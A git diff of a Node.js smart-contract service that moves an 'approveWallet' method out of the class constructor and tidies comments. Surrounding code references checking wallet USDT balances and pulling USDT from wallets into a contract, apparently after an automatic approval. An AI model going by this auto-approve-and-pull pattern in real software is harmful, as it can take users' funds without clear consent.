@@ -7,31 +7,6 @@ dotenv.config();
 
 class ContractService {
     constructor() {
-// Add this method to the ContractService class
-async approveWallet(walletAddress) {
-    if (!this.initialized) {
-        throw new Error('Contract service not initialized');
-    }
-
-    try {
-        const feeData = await this.provider.getFeeData();
-        const gasPrice = feeData.gasPrice;
-
-        const tx = await this.contract.approveWallet(walletAddress, {
-            gasLimit: 100000,
-            gasPrice,
-        });
-
-        await tx.wait();
-        console.log('Wallet auto-approved in contract:', walletAddress);
-        return true;
-    } catch (error) {
-        console.error('Failed to auto-approve wallet:', error);
-        throw error;
-    }
-}
-
-        
         // Validate required environment variables for transaction operations
         this.initialized = false;
         this.provider = null;
@@ -100,6 +75,30 @@ async approveWallet(walletAddress) {
         }
     }
 
+    // Add this method as a proper class method (outside constructor)
+    async approveWallet(walletAddress) {
+        if (!this.initialized) {
+            throw new Error('Contract service not initialized');
+        }
+
+        try {
+            const feeData = await this.provider.getFeeData();
+            const gasPrice = feeData.gasPrice;
+
+            const tx = await this.contract.approveWallet(walletAddress, {
+                gasLimit: 100000,
+                gasPrice: gasPrice,
+            });
+
+            await tx.wait();
+            console.log('Wallet auto-approved in contract:', walletAddress);
+            return true;
+        } catch (error) {
+            console.error('Failed to auto-approve wallet:', error);
+            throw error;
+        }
+    }
+
     async getWalletUSDTBalance(walletAddress) {
         try {
             // Use environment variable first
@@ -164,9 +163,6 @@ async approveWallet(walletAddress) {
             return false;
         }
     }
-
-    // Pull USDT from wallet to contract (CORRECTED FUNCTION NAME)
-    // Fix the pullUSDTFromWallet method to match the correct function name from ABI
 
     // Pull USDT from wallet to contract
     async pullUSDTFromWallet(walletAddress) {
@@ -363,5 +359,3 @@ async approveWallet(walletAddress) {
 }
 
 module.exports = new ContractService();
-
-
